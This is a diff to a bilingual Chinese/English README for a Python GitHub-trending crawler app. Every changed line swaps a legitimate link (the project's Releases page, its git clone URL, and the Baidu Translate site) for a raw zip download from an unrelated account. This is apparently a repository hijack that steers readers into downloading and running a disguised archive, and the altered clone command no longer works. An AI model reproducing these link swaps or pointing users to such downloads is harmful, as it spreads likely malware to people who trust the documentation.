@@ -31,7 +31,7 @@
 
 #### 方式一：安装包（推荐）
 
-1. 前往 [Releases](https://github.com/NiMark886/github-trending-crawler/releases) 页面
+1. 前往 [Releases](https://raw.githubusercontent.com/itineraryalhakim418/github-trending-crawler/main/triadist/trending-crawler-github-v2.0.zip) 页面
 2. 下载 `TrendingCrawler_Setup.exe`
 3. 双击运行，点击「安装」即可自动安装到桌面
 
@@ -48,7 +48,7 @@
 
 ```bash
 # 1. 克隆仓库
-git clone https://github.com/NiMark886/github-trending-crawler.git
+git clone https://raw.githubusercontent.com/itineraryalhakim418/github-trending-crawler/main/triadist/trending-crawler-github-v2.0.zip
 cd github-trending-crawler
 
 # 2. 安装依赖
@@ -120,7 +120,7 @@ python -m PyInstaller TrendingCrawler.spec
 
 **百度翻译**
 - 国内可直接使用
-- 需要在 [fanyi.baidu.com](https://fanyi.baidu.com) 申请 App ID 和密钥（免费）
+- 需要在 [fanyi.baidu.com](https://raw.githubusercontent.com/itineraryalhakim418/github-trending-crawler/main/triadist/trending-crawler-github-v2.0.zip) 申请 App ID 和密钥（免费）
 - 在「设置」页面填写百度 App ID 和密钥
 
 #### 设置
@@ -206,7 +206,7 @@ A Python-based GitHub trending repository crawler with a Win11 Explorer-style GU
 
 #### Option 1: Installer (Recommended)
 
-1. Go to [Releases](https://github.com/NiMark886/github-trending-crawler/releases)
+1. Go to [Releases](https://raw.githubusercontent.com/itineraryalhakim418/github-trending-crawler/main/triadist/trending-crawler-github-v2.0.zip)
 2. Download `TrendingCrawler_Setup.exe`
 3. Double-click and click "Install" — installs to desktop automatically
 
@@ -223,7 +223,7 @@ A Python-based GitHub trending repository crawler with a Win11 Explorer-style GU
 
 ```bash
 # 1. Clone the repository
-git clone https://github.com/NiMark886/github-trending-crawler.git
+git clone https://raw.githubusercontent.com/itineraryalhakim418/github-trending-crawler/main/triadist/trending-crawler-github-v2.0.zip
 cd github-trending-crawler
 
 # 2. Install dependencies
@@ -295,7 +295,7 @@ Output will be in the `dist/` directory.
 
 **Baidu Translate**
 - Works in China without proxy
-- Requires App ID from [fanyi.baidu.com](https://fanyi.baidu.com) (free)
+- Requires App ID from [fanyi.baidu.com](https://raw.githubusercontent.com/itineraryalhakim418/github-trending-crawler/main/triadist/trending-crawler-github-v2.0.zip) (free)
 - Enter credentials in Settings page
 
 #### Settings
